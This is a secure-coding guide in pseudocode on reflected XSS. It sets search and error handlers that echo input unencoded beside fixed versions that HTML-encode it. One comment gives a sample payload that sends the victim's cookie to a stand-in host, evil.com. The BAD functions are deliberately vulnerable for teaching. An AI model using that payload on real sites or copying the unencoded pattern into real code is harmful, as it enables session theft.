# Reflected XSS (Echoing User Input)


```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: User input directly echoed in response
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Vulnerable: User input inserted directly into HTML
    html = "<h1>Search results for: " + query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Vulnerable: Error parameter reflected without encoding
    RETURN "<div class='error'>" + error_message + "</div>"
END FUNCTION

// Attack: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Result: Script executes in victim's browser, stealing their session

// ========================================
// GOOD: HTML-encode all user input before rendering
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Safe: HTML-encode user input
    safe_query = html_encode(query)

    html = "<h1>Search results for: " + safe_query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Safe: Encode before inserting into HTML
    RETURN "<div class='error'>" + html_encode(error_message) + "</div>"
END FUNCTION

// HTML encoding function
FUNCTION html_encode(input):
    result = input
    result = result.replace("&", "&amp;")
    result = result.replace("<", "&lt;")
    result = result.replace(">", "&gt;")
    result = result.replace('"', "&quot;")
    result = result.replace("'", "&#x27;")
    RETURN result
END FUNCTION
```
